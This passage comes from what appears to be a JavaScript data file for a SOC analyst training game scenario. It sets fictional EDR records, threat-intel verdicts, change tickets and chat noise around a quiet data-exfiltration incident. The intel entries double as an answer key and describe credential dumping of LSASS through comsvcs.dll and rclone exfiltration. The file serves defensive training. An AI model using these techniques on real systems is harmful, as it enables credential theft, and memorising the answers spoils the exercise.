        { pid: 110, ppid: 10, name: 'invtrack_agent.exe', cmd: 'C:\\Program Files\\InvTrack\\invtrack_agent.exe', user: 'NT AUTHORITY\\SYSTEM', start: '08:00:00', signed: true, publisher: 'InvTrack Solutions LLC', sha256: 'h_invtrack_9988776655443322110099887766554433221100998877665544332211009', flag: null, note: 'Internal warehouse inventory agent, known Defender heuristic FP on this build' },
        { pid: 120, ppid: 10, name: 'MsMpEng.exe', cmd: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe', user: 'NT AUTHORITY\\SYSTEM', start: '00:00:15', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-msmpeng', flag: null, note: 'Defender engine - quarantined pid 110 after signature update 1.423.112.0' }
      ],
      connections: [],
      files: []
    },
    'h-ws-mquinn': {
      processes: [
        { pid: 10, ppid: null, name: 'explorer.exe', cmd: 'C:\\Windows\\explorer.exe', user: 'CORP\\mquinn', start: '08:25:00', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-explorer', flag: null, note: 'User shell' },
        { pid: 200, ppid: 10, name: 'chrome.exe', cmd: 'chrome.exe', user: 'CORP\\mquinn', start: '09:55:00', signed: true, publisher: 'Google LLC', sha256: 'sys-chrome', flag: null, note: 'Browser, downloaded installer from vendor portal' },
        { pid: 210, ppid: 200, name: 'MeridianERPSetup_v14.2.exe', cmd: 'MeridianERPSetup_v14.2.exe /silent /log install.log', user: 'CORP\\mquinn', start: '10:00:00', signed: true, publisher: 'Meridian Systems Inc.', sha256: 'h_meridian_55aa33cc77ee99bb11dd44ff22ee66aa88cc00bb11dd22ee33ff44aa55bb66', flag: 'suspicious', note: 'Packer heuristic match; hash matches vendor-published release checksum' }
      ],
      connections: [
        { t: '09:58:00', pid: 200, proc: 'chrome.exe', dst: '203.0.113.200:443', domain: 'portal.meridiansystems-erp.com', proto: 'TCP' }
      ],
      files: [
        { t: '10:03:00', pid: 210, op: 'create', path: 'C:\\ProgramData\\Meridian\\install.log', sha256: 'h_meridian_installlog' }
      ]
    }
  };

  const intel = {
    'swift-filedrop.com': { verdict: 'malicious', summary: 'Newly-registered domain with no legitimate business relationship to Caldwell-Fenn; resolves to infrastructure also hosting known rclone/cloud-sync exfiltration drop points. First seen in this environment on 2026-11-10.', source: 'OTX' },
    '203.0.113.77': { verdict: 'malicious', summary: 'Hosting provider IP backing swift-filedrop.com; associated with multiple exfiltration-as-a-service reports in the last 90 days.', source: 'VirusTotal' },
    'h_rclone_7f3a9c1d2e4b5f608192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f': { verdict: 'suspicious', summary: 'rclone.exe is a legitimate open-source sync tool; this specific copy is unsigned and was dropped outside Program Files, a pattern associated with data-exfiltration tradecraft rather than IT-sanctioned use.', source: 'Internal' },
    'h_7zip_c4ca4238a0b923820dcc509a6f75849bd1e2c3f4a5b6c7d8e9f0a1b2c3d4e5f6': { verdict: 'benign', summary: 'Legitimate 7-Zip command-line binary (7za.exe), hash matches the official 7-Zip release; widely used internally for routine archiving. Context of use, not the hash, is what matters here.', source: 'VirusTotal' },
    'h_adfind_2b5e1f3a7c9d8b6e4f0a1c3d5e7f9b1a3c5e7f9b1d3f5a7c9e1b3d5f7a9c1e3': { verdict: 'malicious', summary: 'AdFind is a legitimate AD query tool frequently abused by ransomware affiliates (e.g. observed in multiple pre-encryption discovery phases) for bulk domain reconnaissance.', source: 'OTX' },
    'h_loader_a9c3e5f7b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a': { verdict: 'malicious', summary: 'Known credential-access loader: hidden-window encoded PowerShell stager that invokes LSASS memory dumping via comsvcs.dll MiniDump.', source: 'Internal' },
    'h_meridian_55aa33cc77ee99bb11dd44ff22ee66aa88cc00bb11dd22ee33ff44aa55bb66': { verdict: 'benign', summary: 'Hash matches the vendor-published checksum for MeridianERPSetup v14.2 on the Meridian Systems support portal. Authenticode-signed.', source: 'WHOIS' },
    'h_invtrack_9988776655443322110099887766554433221100998877665544332211009': { verdict: 'benign', summary: 'Internal warehouse inventory scanner agent (InvTrack Solutions). Known Defender heuristic false-positive (Wacatac.B!ml) following signature version 1.423.112.0; vendor confirmed clean.', source: 'Internal' },
    '198.51.100.22': { verdict: 'benign', summary: 'Corporate Azure Blob Storage endpoint (cfindustrialbackup.blob.core.windows.net), documented in network architecture as the Veeam offsite DR repository.', source: 'Internal' },
    '198.51.100.44': { verdict: 'benign', summary: 'Known NAT egress IP for Meridian Systems Inc. VPN gateway, used for approved vendor remote-support sessions per the vendor support agreement.', source: 'Internal' },
    'cf-industrialsupply-portal.net': { verdict: 'benign', summary: 'Landing page registered by Caldwell-Fenn\'s marketing agency for a trade-show giveaway campaign. Lexically similar to the corporate domain but confirmed legitimate; no credential harvesting or malicious content observed.', source: 'WHOIS' },
    'h_psexec_legit_00112233445566778899aabbccddeeff0011223344556677889900aabbccd': { verdict: 'benign', summary: 'Standard Sysinternals PsExec64.exe, Authenticode-signed by Microsoft/Sysinternals. Legitimately used by IT for remote administration; the same tool name is also abused elsewhere in this environment - verify account and context, not just the binary.', source: 'Internal' },
    'h_sccmscript_112233445566778899aabbccddeeff00112233445566778899aabbccddeef': { verdict: 'benign', summary: 'Decoded payload matches Verify-NovRollup-Compliance.ps1, the SCCM-distributed patch compliance verification script for the November 2026 security rollup.', source: 'Internal' },
    'h_psexesvc_f1e2d3c4b5a697887766554433221100aabbccddeeff00112233445566778': { verdict: 'malicious', summary: 'PSEXESVC.exe binary dropped on FS02 via SMB from WKS-WBOYCE under the compromised svc-backup session; hash does not match the legitimate Sysinternals PsExec service binary and was not associated with any change ticket.', source: 'Internal' },
    '10.40.14.63': { verdict: 'suspicious', summary: 'Internal IP for WKS-WBOYCE (warehouse supervisor workstation); not an expected source for svc-backup authentication to any file server or backup system.', source: 'Internal' },
    'wks-wboyce': { verdict: 'suspicious', summary: 'Warehouse supervisor workstation identified as the source of anomalous svc-backup authentication to FS02; this host has no legitimate backup-administration function and shows prior LSASS credential-dumping activity.', source: 'Internal' },
    'svc-backup': { verdict: 'suspicious', summary: 'Veeam backup service account; credentials appear compromised and were used outside the normal nightly Veeam job context on 2026-11-10 (NTLM logon from an unusual workstation, domain recon, Defender tamper, exfiltration staging).', source: 'Internal' }
  };

  const changes = [
    { at: '00:30', system: 'SCCM01 / All Endpoints', desc: 'Patch Tuesday - November 2026 security rollup push via SCCM, PowerShell deployment package and phased reboots through mid-morning.', owner: 'Derek Hollis', ticket: 'CHG-4450' },
    { at: '02:00', system: 'FS01 / NAS02', desc: 'Veeam backup repository migration - robocopy /MIR mirror of \\\\FS01\\Shared$ to new NAS mount, maintenance window 01:00-05:00.', owner: 'Nina Castillo', ticket: 'CHG-4455' },
    { at: '06:00', system: 'TENSCAN01 / All Subnets', desc: 'Tenable authenticated vulnerability scan - monthly CIS compliance sweep across all subnets, 06:00-09:00, scanner account svc-tenable-scan.', owner: 'Felix Amaro', ticket: 'CHG-4480' },
    { at: '07:00', system: 'All Systems', desc: 'Patch Tuesday maintenance window - WSUS approval and SCCM deployment to all workstations/servers, phased reboots 07:00-11:00.', owner: 'Derek Hollis', ticket: 'CHG-4471' },
    { at: '07:30', system: 'WKS-CDAO', desc: 'Local administrator group addition on new-hire workstation for imaging/software installs.', owner: 'Owen Pratt', ticket: 'CHG-4487' },
    { at: '08:00', system: 'JUMP01', desc: 'Vendor remote support session - RDP via VPN for ERP invoicing module troubleshooting, approved vendor Meridian Systems.', owner: 'Felix Amaro', ticket: 'CHG-4490' },
    { at: '10:00', system: 'BKP01', desc: 'Offsite cloud backup sync rescheduled to daytime (10:30-12:00) due to conflict with Patch Tuesday overnight maintenance window.', owner: 'Nina Castillo', ticket: 'CHG-4499' },
    { at: '13:00', system: 'SQL01', desc: 'SQL01 patch reboot window, 13:00-13:30, approved.', owner: 'Dmitri Kowalski', ticket: 'CHG-4495' }
  ];

  const chat = [
    { at: '07:55', from: 'chidi', text: 'Patch Tuesday today - expect reboot noise all morning, do not panic on service-stop alerts.' },
    { at: '08:10', from: 'sam', text: 'Heads up, helpdesk queue is slammed with password reset tickets post-patch. If you get weird lockouts check if it is just cached creds.' },
    { at: '08:45', from: 'tom', text: 'Anyone else seeing a ton of Tenable scan alerts? Scanner is running its monthly authenticated sweep.' },
    { at: '09:30', from: 'dana', text: 'Reminder: do not close anything patch-related without checking the change calendar first.' },
    { at: '10:05', from: 'lena', text: 'Pushed the weekly IOC digest, nothing new overnight. Will flag if that changes.' },
    { at: '11:20', from: 'bob', text: 'If you see PsExec from JUMP01 today it is probably Yusuf pushing stragglers, but still log it.' },
    { at: '12:40', from: 'priya', text: 'Working a ticket from yesterday, might be slow to respond for a bit.' },
    { at: '14:15', from: 'marcus', text: 'IR is heads-down on tabletop prep this afternoon, ping me directly if something looks real.' }
  ];

  window.SOC_SCENARIOS.push({
    id: 's3-patch-tuesday',
    title: 'Patch Tuesday',
    tagline: 'Patch day noise hides a quiet exit.',
    difficulty: 'Hard',
    date: '2026-11-10',
    shift: { start: '08:00', end: '16:00' },
    company: {
      name: 'Caldwell-Fenn Industrial Supply',
      domain: 'cfindustrial.com',
      industry: 'Manufacturing & Distribution (industrial fasteners and components)',
      blurb: 'Mid-size manufacturer/distributor of industrial fasteners and components, ~900 staff across HQ, a distribution center, and two production plants. On-prem AD, SCCM/WSUS patching, Veeam backups, Defender for Endpoint, and Tenable vulnerability scanning.'
    },
    handover: 'Quiet overnight. Heads up: today is Patch Tuesday - SCCM began pushing the November security rollup at 00:30 with phased reboots continuing through mid-morning, so expect a wave of service-stop/restart noise.\nTenable runs its monthly authenticated scan 06:00-09:00 across all subnets, which tends to trip failed-logon and lateral-movement-style rules - that is expected.\nThe Veeam repo migration from FS01 to the new NAS mount finished its overnight window around 05:00; there may be leftover file-modification alerts on FS01, see CHG-4455.\nThe offsite Veeam cloud sync got rescheduled to daytime (CHG-4499) because of the maintenance conflict, so do not be surprised by a large BKP01 transfer later this morning.\nNothing open from last shift. Watch the queue, and double-check the change calendar before closing anything patch-related.',
    users,
    hosts,
    alerts,
    events,
    edr,
    intel,
    changes,
    chat
  });
})();
